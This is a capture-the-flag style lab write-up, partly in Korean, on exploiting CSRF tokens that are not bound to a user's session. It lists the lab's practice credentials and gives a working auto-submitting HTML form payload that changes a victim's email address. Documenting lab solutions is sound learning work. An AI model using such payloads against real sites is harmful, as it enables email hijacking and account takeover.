# 🚩Lab: CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

`wiener:peter`
`carlos:montoya`

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인한다.
2. 계정 wiener의 csrf 키를 복사해놓는다.
3. 계정 carlos로 로그인한다. 이메일 변경 요청을 보내며 proxy로 가로챈다.
4. csrf 토큰을 wiener의 토큰으로 교체하여 전송한다.
5. 성공적으로 이메일이 변경된다.
6. 해당 랩에서는 CSRF 토큰이 세션과 매칭되어 있지 않아, 다른 세션의 CSRF 토큰으로도 검증을 통과 할 수 있다.
7. carlos의 CSRF토큰을 사용해 다른 유저를 타겟으로 이메일을 변경하는 HTML 페이지를 작성하자.
```html
<body>
<script>
var f = document.createElement('form');
f.method = "POST";
f.action = "email변경 API";

var e = document.createElement('input');
e.name = "email";
e.value = "hack@ED.COM";

var csrf = document.createElement('input');
csrf.name = "csrf";
csrf.value = "carlos의 CSRF 토큰 값";

f.appendChild(e);
f.appendChild(csrf);

document.body.appendChild(f);

f.submit();
</script>
</body>
```
                        
### 💡 취약점 원리
 CSRF토큰을 세션과 매칭하지 않고 단순히 서버에서 발급된 CSRF 라면 검증을 통과시키는 취약한 검증 구현. 
